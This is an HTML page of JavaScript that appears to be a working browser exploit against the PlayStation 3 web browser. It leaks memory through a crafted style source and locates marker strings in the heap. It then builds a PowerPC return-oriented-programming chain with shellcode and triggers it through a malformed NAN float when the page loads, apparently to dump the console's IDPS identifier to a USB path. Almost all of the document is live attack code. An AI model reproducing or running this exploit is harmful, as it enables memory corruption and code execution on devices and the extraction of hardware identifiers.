<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>

//var blr = unescape("\u4E80\u0020");
//var mtspr = unescape("\u7C08\u03A6");
//var nop = unescape("\u6000\u0000");

function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

function bin2unescape(str, n) {
   var a = [], start=0;
   while(start<str.length) {
   if (a === "\0") {
    str.replace("\0", "\\0");
   }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		//var search_base = 0x80150000;
		//var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x10)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,payload,init_rtn,idps_storage_usb,idps_hex,idps_base,usb_generic_storage,jump_2,jump_1,g,j1,j2;
		var payload_addr=0;		
		var init_rtn_addr = 0;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var idps_storage_usb_addr=0;
		var idps_hex_addr=0;
		var idps_base_addr=0;
		var usb_generic_storage_addr = 0;

		// Find Payload Pointer Address
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder
		payload_addr = findExploit("payload",payload,0x80150000,0x450000,0x2F2A,0x18);
		}
		while(payload_addr==0);
		
		// Find Initial Return Address Pointer
		dbg("Processing init_rtn strings.. Searching for valid offset....");
		do{
		init_rtn =  unescape("\uDEAD\u0009\u76BC\uDEAD"); // <-- set to gadget #2
		init_rtn_addr = findExploit("init_rtn",init_rtn,0x80150000,0x450000,0xDEAD,0x4);
		}
		while(init_rtn_addr==0);
		
		// Find IDPS USB Storage Address
		/*
		/dev_usb000/idps.bin
		\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E
		*/
		dbg("Processing idps_storage_usb strings.. Searching for valid offset....");
		do{
		idps_storage_usb =  unescape("\u2220\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E\u2220");
		idps_storage_usb_addr = findExploit("idps_storage_usb",idps_storage_usb,0x80150000,0x450000,0x2220,0x14);
		}
		while(idps_storage_usb_addr==0);
		
		// Find IDPS Hex Bytes Address
		dbg("Processing idps_hex strings.. Searching for valid offset....");
		do{
		idps_hex =  unescape("\u2F4A\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u2F4A");
		idps_hex_addr = findExploit("idps_hex",idps_hex,0x80150000,0x450000,0x2F4A,0x10);
		}
		while(idps_hex_addr==0);
		
		// Find IDPS Base Address Pointer [0x00735F98]
		dbg("Processing idps_base strings.. Searching for valid offset....");
		do{
		idps_base =  unescape("\u2F5A\u0000\u0000\u0073\u5F98\u2F5A");
		idps_base_addr = findExploit("idps_base",idps_base,0x80150000,0x450000,0x2F5A,0x8);
		}
		while(idps_base_addr==0);
		
		// Find USB Generic Storage Address Pointer
		// \u2F64\u6576\u5F75\u7362 <-- /dev_usb
		dbg("Processing usb_generic_storage strings.. Searching for valid offset....");
		do{
		usb_generic_storage =  unescape("\uDEDD\u2F64\u6576\u5F75\u7362\uDEDD");
		usb_generic_storage_addr = findExploit("usb_generic_storage",usb_generic_storage,0x80150000,0x450000,0xDEDD,0x8);
		}
		while(usb_generic_storage_addr==0);
		
		
		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// **************************************************************************************
		// DEX
		// execute gadget #1
		// gadget entry
		/*
		002DE40C F9610000 std        r11,0x0(r1)                   03 (002DE408) REG PIPE LSU
		002DE410 813F0070 lwz        r9,0x70(r31)
		002DE414 7B650020 clrldi     r5,r27,32
		002DE418 7BA60020 clrldi     r6,r29,32
		002DE41C 7D244B78 mr         r4,r9                          PIPE
		002DE420 7B870020 clrldi     r7,r28,32
		002DE424 7B480020 clrldi     r8,r26,32                      PIPE
		002DE428 81690000 lwz        r11,0x0(r9)
		002DE42C 7B0A0020 clrldi     r10,r24,32
		002DE430 7B290020 clrldi     r9,r25,32
		002DE434 38610088 addi       r3,r1,0x88                     PIPE
		002DE438 816B000C lwz        r11,0xC(r11)
		002DE43C 800B0000 lwz        r0,0x0(r11)                   03 (002DE438) REG PIPE LSU
		002DE440 F8410028 std        r2,0x28(r1)
		002DE444 7C0903A6 mtspr      ctr,r0                        01 (002DE43C) REG
		002DE448 804B0004 lwz        r2,0x4(r11)
		002DE44C 4E800421 bctrl 
		*/
		gadget =  unescape("\u4444\u002D\uE40C");// 6 bytes [total: 6 bytes]
		
		gadget =  gadget+unescape("\uDECA\uF01E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		gadget =  gadget+unescape("\u8020\u0030");// r3
		
		gadget =  gadget+unescape("\u8020\u0090");// r9
		
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE");
		
		gadget =  gadget+unescape("\u4444\u4444\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2444\u2222\u2333\u2444\u2555\u2666\u2777\u2888\u2999\u2AAA\u2BBB\u2CCC\u2DDD\u2EEE\u4444\u4222\u4333\u4444\u4555\u4666\u4777\u4888\u4999\u4AAA\u4BBB\u4CCC\u4DDD\u4EEE");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// padding + find marker NEW
		gadget =  gadget+unescape("\u4141\u4141\u696A\u696B\u4141\u4141\u7E2A"); // 14 bytes
		// **************************************************************************************
		
		
		// CEX
		//gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		//gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		//gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		//gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes
		
		
		// write found payload address
		//gadget = gadget.replaceAt(285, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(286, hexh2bin(payload_addr));
		gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		
		
		// Write found addresses to gadgets hex
		// BABECAFE 3133065982
		// DEADBEEF 3735928559
		// A55FACE5 2774510821
		
		//                                 [dummy	gadget	register]
		// FEED0428 <--placeholder example [FEED	04		28		]
		
		//-------------------------------------------------------------------
		// write to gadget #1
		
		// write found address to r3
		gadget = gadget.replaceAt(97, hexh2bin((idps_storage_usb_addr) >> 16));
		gadget = gadget.replaceAt(98, hexh2bin(idps_storage_usb_addr));
		
		// write found address to r9
		gadget = gadget.replaceAt(99, hexh2bin((init_rtn_addr) >> 16));
		gadget = gadget.replaceAt(100, hexh2bin(init_rtn_addr));
		//-------------------------------------------------------------------
		
		
		
		// Find Gadgets Pointer
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x1B8);
		//gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x644);
		}
		while(gadget_addr==0);
		
		
		// Find jump_2 Address
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2A2F");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));	
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x80150000,0x450000,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		// Find jump_1 Address
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x80150000,0x450000,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		
		// Debug Output To Python
		dbg("                                                ");
		dbg("------------------------------------------------");
		dbg("All required offsets have been found....");
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- GADGETS ------------------------------------");
		dbg("gadget: "+s2hex(gadget));
		dbg("gadget (g): "+s2hex(g));
		dbg("                                                ");
		dbg("--- GADGETS CONTINUED---------------------------");
		dbg("payload: "+s2hex(payload));
		dbg("init_rtn: "+s2hex(init_rtn));
		dbg("jump_2: "+s2hex(j2));
		dbg("jump_1: "+s2hex(j1));
		dbg("idps_storage_usb: "+s2hex(idps_storage_usb));
		dbg("idps_hex: "+s2hex(idps_hex));
		dbg("idps_base: "+s2hex(idps_base));
		dbg("usb_generic_storage: "+s2hex(usb_generic_storage));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- OFFSETS ------------------------------------");
		dbg("gadget offset: 0x"+gadget_addr.toString(16));
		dbg("payload offset: 0x"+payload_addr.toString(16));
		dbg("init_rtn_addr offset: 0x"+init_rtn_addr.toString(16));
		dbg("jump_2 offset: 0x"+jump_2_addr.toString(16));
		dbg("jump_1 offset: 0x"+jump_1_addr.toString(16));	
		dbg("idps_storage_usb_addr offset: 0x"+idps_storage_usb_addr.toString(16));	
		dbg("idps_hex_addr offset: 0x"+idps_hex_addr.toString(16));
		dbg("idps_base_addr offset: 0x"+idps_base_addr.toString(16));
		dbg("usb_generic_storage_addr offset: 0x"+usb_generic_storage_addr.toString(16));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("Triggering exploit....");
		trigger(jump_1_addr);				
		
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, refresh the page because the exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
